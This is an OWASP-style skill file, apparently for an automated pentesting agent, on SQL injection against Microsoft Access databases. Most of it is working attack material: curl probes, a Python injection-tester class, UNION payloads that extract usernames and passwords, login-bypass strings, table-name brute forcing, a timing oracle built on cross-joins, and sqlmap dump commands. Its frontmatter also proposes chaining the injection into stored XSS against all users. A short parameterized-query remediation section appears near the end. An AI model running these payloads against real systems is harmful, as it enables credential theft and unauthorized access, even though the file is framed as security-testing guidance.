---
name: wstg-inpv-05.5
description: "Testing for SQL Injection - MS Access"
category: input-validation
owasp_id: WSTG-INPV-05.5
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, xss, sqli, wstg, inpv]
tech_stack: []
cwe_ids: []
chains_with: [wstg-inpv-01, wstg-inpv-02]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-inpv-02: "MS Access Injection grants INSERT/UPDATE access to write an unsanitized script payload directly into a stored field, achieving persistent Stored XSS against every user who views the record = Critical (Mass Account Compromise)"
---

# wstg-inpv-05.5

## Test ID

WSTG-INPV-05.5

## Test Name

Testing for SQL Injection - MS Access

## High-Level Description

Microsoft Access SQL injection testing targets Access databases (Jet/ACE engine) often used in legacy or small-scale web applications. Access has limited features compared to enterprise databases but can still be exploited for data extraction and authentication bypass.

---

## What to Check

- [ ] Access-specific error messages
- [ ] MSysObjects system table
- [ ] IIF() function (Access-specific)
- [ ] TOP keyword instead of LIMIT
- [ ] Date format (#date#)

---

## How to Test

### Step 1: MS Access Detection

```bash
#!/bin/bash
TARGET="https://target.com/product?id="

echo "[*] Testing for MS Access database..."

# Error-based detection
curl -s "${TARGET}'" | grep -iE "Microsoft Access|JET Database|ODBC Microsoft Access|\.mdb"

# Access-specific syntax test
curl -s "${TARGET}' AND IIF(1=1,1,0)=1--"

# TOP keyword (Access uses TOP not LIMIT)
curl -s "${TARGET}' UNION SELECT TOP 1 NULL--"
```

### Step 2: MS Access SQLi Payloads

```python
#!/usr/bin/env python3
"""
MS Access SQL Injection Tester
"""

import requests
import re

class AccessSQLiTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # MS Access error patterns
    ACCESS_ERRORS = [
        r"Microsoft Access Driver",
        r"JET Database Engine",
        r"Access Database Engine",
        r"ODBC Microsoft Access",
        r"Syntax error in query expression",
        r"Operation must use an updateable query",
        r"\.mdb",
        r"\.accdb",
    ]

    # Access-specific payloads
    ACCESS_PAYLOADS = {
        'detection': [
            "' AND IIF(1=1,1,0)=1--",
            "' UNION SELECT NULL FROM MSysObjects--",
        ],
        'union_based': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
        ],
        'boolean_based': [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' AND IIF(1=1,1,0)=1--", "' AND IIF(1=2,1,0)=1--"),
        ],
        'time_based': [
            # Access doesn't have sleep, use heavy queries
            "' AND (SELECT COUNT(*) FROM MSysObjects AS T1, MSysObjects AS T2, MSysObjects AS T3)>0--",
        ],
    }

    def detect_access(self, param):
        """Detect if backend is MS Access"""
        print(f"[*] Detecting MS Access database...")

        for payload in self.ACCESS_PAYLOADS['detection']:
            try:
                response = self.session.get(self.url, params={param: payload})

                for pattern in self.ACCESS_ERRORS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"[+] MS Access database detected!")
                        return True

            except Exception as e:
                pass

        return False

    def test_union_based(self, param):
        """Test Access UNION-based injection"""
        print(f"\n[*] Testing MS Access UNION-based injection...")

        for payload in self.ACCESS_PAYLOADS['union_based']:
            try:
                response = self.session.get(self.url, params={param: payload})

                if response.status_code == 200:
                    has_error = False
                    for pattern in self.ACCESS_ERRORS:
                        if re.search(pattern, response.text):
                            has_error = True
                            break

                    if not has_error:
                        print(f"[+] UNION injection possible!")
                        self.findings.append({
                            'type': 'MS Access UNION-based SQLi',
                            'payload': payload,
                            'severity': 'Critical'
                        })
                        return True

            except Exception as e:
                pass

        return False

    def run_tests(self, param='id'):
        """Run all Access SQLi tests"""
        if self.detect_access(param):
            self.test_union_based(param)

        self.generate_report()

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*50)
        print("MS ACCESS SQL INJECTION REPORT")
        print("="*50)

        if not self.findings:
            print("\nNo MS Access SQLi vulnerabilities found.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")

# Usage
tester = AccessSQLiTester("https://target.com/product")
tester.run_tests(param='id')
```

### Step 3: MS Access Data Extraction

```sql
-- List Tables (requires access to system tables)
SELECT Name FROM MSysObjects WHERE Type=1

-- Extract Data
' UNION SELECT TOP 1 username,password,NULL FROM users--

-- Authentication Bypass
' OR '1'='1
admin'--

-- IIF conditional
' AND IIF((SELECT TOP 1 username FROM users)='admin',1,0)=1--

-- Note: Access has limited functionality
-- No stacked queries
-- No sleep function
-- No file operations
```

---

## Tools

| Tool | Description | Usage |
| --- | --- | --- |
| **sqlmap** | Automated SQLi (supports MS Access via `--dbms=access`) | `sqlmap -u "https://{target}/page?id=1" --dbms=access --dump` |
| **Burp Suite** | Manual request tampering/Intruder | Repeater + Intruder with payload list |
| **curl** | Manual boolean/error-based probing | See below |

---

## Example Commands/Payloads

### Detection (curl)

```bash
TARGET="https://target.com/product.asp"

# MS Access-specific error trigger (classic ASP/ADO)
curl -s "$TARGET?id=1'" | grep -Ei "Microsoft JET Database Engine|Microsoft OLE DB Provider for ODBC Drivers|ODBC Microsoft Access Driver"

# Auth bypass on login form
curl -s -X POST "https://target.com/login.asp" -d "user=admin'--&pass=x"
curl -s -X POST "https://target.com/login.asp" -d "user=' OR '1'='1&pass=' OR '1'='1"

# UNION column-count discovery (Access requires exact type/column match, no information_schema)
for n in 1 2 3 4 5; do
  cols=$(python3 -c "print(','.join(['NULL']*$n))")
  curl -s "$TARGET?id=1 UNION SELECT $cols FROM users--"
done

# Blind boolean via IIF (Access has no native SLEEP/WAITFOR - time-based needs heavy subqueries)
curl -s "$TARGET?id=1 AND IIF((SELECT TOP 1 username FROM users)='admin',1,0)=1--"
```

### DBMS Fingerprint (keyword-based, distinguishes Access from other backends)

```sql
val(cvar(1))=1
IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0
```

These evaluate `TRUE`/produce a distinctive error only under Jet/ACE — useful to positively confirm Access when generic error text is suppressed.

### Table/Column Name Guessing (no information_schema in Access)

Access has no `information_schema`, so table and column names must be brute-forced via existence checks rather than enumerated directly:

```sql
-- Confirm a guessed table name exists (error-free response = exists)
' AND (SELECT COUNT(*) FROM users)>=0--
' AND (SELECT COUNT(*) FROM tbl_users)>=0--
' AND (SELECT COUNT(*) FROM admin)>=0--

-- Confirm a guessed column name exists in a known table
' AND (SELECT COUNT(password) FROM users)>=0--
```

### Heavy-Query Time-Based Approximation (Access has no SLEEP/WAITFOR)

```sql
' AND (SELECT COUNT(*) FROM MSysObjects AS T1, MSysObjects AS T2, MSysObjects AS T3)>0--
```

A large self-cross-join against system tables introduces a measurable delay, acting as a crude timing oracle when boolean-based blind is unavailable (e.g. no content-length difference).

### Detection Pattern

| Signal | Meaning |
| ------ | ------- |
| `Microsoft JET Database Engine` / `Microsoft OLE DB Provider for ODBC Drivers` / `ODBC Microsoft Access Driver` in response | Error-based SQLi, confirms MS Access (Jet/ACE engine) backend |
| `UNION SELECT` succeeds only when column count and rough data types match exactly | Access's strict UNION typing confirms DBMS and injectable column count |
| No response delay from `SLEEP()`/`WAITFOR` payloads but boolean `IIF()` comparisons change output | Access lacks time-based primitives — rely on boolean-based blind only |
| `MSysObjects` query returns table names | System catalog access confirms Jet engine internals reachable |
| `val(cvar(1))=1` evaluates true where equivalent generic payloads fail | Jet/ACE-specific function confirms Access over MySQL/MSSQL/PostgreSQL |
| Response measurably slower only for a self-cross-joined `MSysObjects` subquery | Confirms injection point via query cost, substituting for the missing `SLEEP()`/`WAITFOR` primitives |

---

## Remediation

```vb
' VBScript/ASP - Parameterized queries
Dim cmd
Set cmd = Server.CreateObject("ADODB.Command")
cmd.ActiveConnection = conn
cmd.CommandText = "SELECT * FROM users WHERE id = ?"
cmd.Parameters.Append cmd.CreateParameter("id", 3, 1, , userId)
Set rs = cmd.Execute()
```

---

## Risk Assessment

| Finding                        | CVSS | Severity |
| ------------------------------ | ---- | -------- |
| MS Access SQLi data extraction | 7.5  | High     |
| MS Access auth bypass          | 8.1  | High     |

---

## CWE Categories

| CWE ID     | Title         |
| ---------- | ------------- |
| **CWE-89** | SQL Injection |

---

## References

- [OWASP WSTG - Testing for SQL Injection (WSTG-INPV-05)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [PayloadsAllTheThings - SQL Injection (MS Access)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#microsoft-access)

---

## Checklist

```
[ ] MS Access database detected
[ ] UNION-based injection tested
[ ] Boolean-based injection tested
[ ] System tables accessed
[ ] Findings documented
```
